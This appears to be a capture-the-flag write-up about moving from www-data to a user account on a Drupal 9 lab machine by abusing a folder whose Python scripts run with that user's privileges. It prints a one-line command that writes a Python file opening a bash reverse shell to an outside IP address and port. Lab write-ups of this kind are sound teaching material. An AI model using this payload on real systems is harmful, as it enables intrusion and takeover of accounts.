<img width="749" alt="image" src="https://user-images.githubusercontent.com/59768512/164413183-b75a837e-0178-47c0-93b5-fd7dfcb6c662.png">


The Drupal version is Drupal 9:
![image](https://user-images.githubusercontent.com/70077872/164648153-d13cb920-33c4-4213-83f7-b7c1da267191.png)







![image](https://user-images.githubusercontent.com/70077872/164681966-e03a50e1-90cf-4c51-b440-9ac737f28760.png)


![image](https://user-images.githubusercontent.com/70077872/166906144-583269d0-9c37-4ebc-8404-3d39e7c0de05.png)

# Last


After we have gained access to `www-data`, it is time to see if we can gain access the first user. Firstly, by going to `/home/user` reveals that there are is a folder called "coding_project". This folder contains a README file, a shell script and a Scripts folder. As the README file states, the user is tired of people asking him/her to run Python files, so the file states: "to avoid further work on my part you can run any file as me instead!". This is a potential vulnerability as files put in the folder `/scripts` is essentially run with the privileges of the user:

![image](https://user-images.githubusercontent.com/70077872/167387362-d4e82870-b257-4335-8acb-e25c97628496.png)


The `run_files.sh` is just a script that enter the script folder, runs the file(s) with python3, and removes it afterwards. Here, we can put in a file run as the user to try to gain access to the user account:

![image](https://user-images.githubusercontent.com/70077872/167388008-555a28ea-6279-40cc-841b-08f8c5f108c5.png)

A common attack vector would be to execute a python file that runs a reverse shell back to our machine. Since the script is run with user privileges, the reverse shell will ensure the connection runs with the user; giving us access. To execute this, and to allow python to run bash commands, we use the `os.system()` function which allows us to execute any command. The following code is a one-liner which is able to exploit this vulnerability:

echo "import os;os.system(\"/bin/bash -c \'bash -i >& /dev/tcp/10.225.149.204/9995 0>&1\'\")" > exploit.py
